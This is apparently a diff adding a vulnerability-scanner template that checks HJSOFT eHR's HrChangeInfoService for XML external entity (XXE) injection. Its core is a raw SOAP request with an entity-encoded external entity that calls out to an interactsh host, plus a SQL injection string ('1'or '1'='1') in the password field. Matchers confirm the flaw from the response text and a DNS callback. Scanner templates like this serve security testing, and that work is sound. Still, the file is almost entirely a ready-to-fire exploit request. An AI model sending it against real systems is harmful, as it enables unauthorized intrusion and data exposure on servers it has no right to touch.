@@ -1,0 +1,38 @@
+id: hjsoft-ehr-returnsynchroxml-xxe
+info:
+  name: "HJSOFT eHR returnSynchroXml XXE Vulnerability"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog, xxe
+http:
+  - raw:
+      - |
+        POST /services/HrChangeInfoService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrc="http://www.hjsj.com/HrChangeInfoService">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <hrc:returnSynchroXml>
+                 <hrc:strString>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x66;&#x6f;&#x6f;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;http://{{interactsh-url}}&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#x20;&#x5d;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;</hrc:strString>
+                 <hrc:username>1</hrc:username>
+                 <hrc:password>1'or '1'='1</hrc:password>
+              </hrc:returnSynchroXml>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "接收已同步信息数据更新成功"
+          - "returnSynchroXmlResponse"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
